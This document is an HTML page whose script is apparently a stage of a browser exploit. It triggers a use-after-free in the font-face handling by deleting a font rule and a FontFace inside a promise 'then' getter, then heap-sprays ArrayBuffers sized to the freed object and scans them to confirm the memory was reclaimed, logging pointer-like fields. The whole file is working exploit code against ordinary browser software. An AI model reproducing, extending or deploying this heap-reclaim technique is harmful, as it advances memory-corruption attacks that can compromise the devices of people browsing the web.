<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>P2</title>
<style>body{font-size:28px;font-family:sans-serif;background:#111;color:#0f0}pre{white-space:pre-wrap;font-size:22px}</style>
<style id="s0">@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }</style>
</head>
<body>
<h3 id="st">stage A</h3>
<pre id="out"></pre>
<script>
// Phase 2 v7: heavy reclaim - 4 size classes x 100 buffers, second-pass spray
// after the getter returns (microtask + timer), marker oracle per class/slot.
function log(s) {
  document.getElementById('out').textContent += s + "\n";
}
function hex(n, w) {
  var h = n.toString(16);
  while (h.length < (w || 16)) h = '0' + h;
  return '0x' + h;
}

log('UA = ' + navigator.userAgent);

var CLASSES = [192, 200, 208, 224];      // size classes around CSSFontFace
var PER = 100;                            // buffers per class
var sprays = [];                          // {buf, len, base, cls, slot, pass}

function sprayPass(pass) {
  for (var c = 0; c < CLASSES.length; c++) {
    var len = CLASSES[c];
    for (var s = 0; s < PER; s++) {
      var b = new ArrayBuffer(len);
      var u = new Uint8Array(b);
      var base = (pass * 61 + c * 83 + s * 7) & 0xff;
      for (var j = 0; j < len; j++) u[j] = (base + j) & 0xff;
      sprays.push({ buf: b, len: len, base: base, cls: len, slot: s, pass: pass });
    }
  }
}

function scan(tag) {
  var hits = [];
  for (var i = 0; i < sprays.length; i++) {
    var r = sprays[i];
    var u = new Uint8Array(r.buf);
    var diff = 0;
    for (var j = 0; j < r.len; j++)
      if (u[j] !== ((r.base + j) & 0xff)) diff++;
    if (diff > 0) hits.push([r, diff]);
  }
  log('scan(' + tag + '): ' + hits.length + ' of ' + sprays.length + ' changed');
  for (var k = 0; k < hits.length && k < 4; k++) {
    var r = hits[k][0];
    log('pass' + r.pass + ' len' + r.cls + ' slot' + r.slot + ': ' + hits[k][1] + 'B differ');
    var dv = new DataView(r.buf);
    log('  +0x00 u32 : ' + hex(dv.getUint32(0, true), 8));
    log('  +0x58 u64 : ' + hex(dv.getBigUint64(0x58, true)) + ' (m_clients?)');
    log('  +0x68 u64 : ' + hex(dv.getBigUint64(0x68, true)) + ' (m_wrapper?)');
    log('  +0x85 byte: ' + hex(dv.getUint8(0x85), 2));
  }
  if (hits.length) log('RECLAIM CONFIRMED');
  return hits.length;
}

function trigger() {
  log('stage B: trigger in 3s');
  setTimeout(function () {
    log('triggering + heavy spray');

    var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;

    var fired = 0;
    Object.defineProperty(FontFace.prototype, 'then', {
      configurable: true,
      get: function () {
        fired++;
        if (this === A && fired === 1) {
          log('GETTER FIRED - free + spray pass 1');
          try { document.getElementById('s0').sheet.deleteRule(0); } catch (e) {}
          document.fonts.delete(A);          // 14.10 shape: ALSO remove the JS face
          document.body.offsetTop;               // force recalc -> FREE
          sprayPass(1);                          // 400 buffers, 4 classes
          // drive the font machinery AFTER the spray so a reclaimed chunk
          // MUST show engine writes (recreate rule + recalc + check)
          try {
            var st = document.createElement('style');
            st.textContent = "@font-face { font-family: x; src: local(Helvetica Narrow); unicode-range: U+0043; }";
            document.head.appendChild(st);
            document.body.offsetTop;
            document.fonts.check('1em x', 'A');
            document.fonts.check('1em x', 'ABC');
            log('fonts.status after drive: ' + document.fonts.status);
          } catch (e2) { log('drive threw: ' + e2); }
        }
        return undefined;
      }
    });

    // second + third spray passes right after the getter returns
    if (typeof queueMicrotask === 'function')
      queueMicrotask(function () { sprayPass(2); });
    setTimeout(function () { sprayPass(3); }, 0);

    try {
      document.fonts.load('1em x', 'AB').then(
        function (faces) { log('load resolved ' + (faces ? faces.length : '?') + ' faces'); },
        function (e) { log('load rejected: ' + e); }
      );
    } catch (e) { log('load threw: ' + e); }

    setTimeout(function () { if (!scan('2s')) {} }, 2000);
    setTimeout(function () { scan('6s'); }, 6000);
  }, 3000);
}

log('armed');
window.onload = trigger;
</script>
</body>
</html>
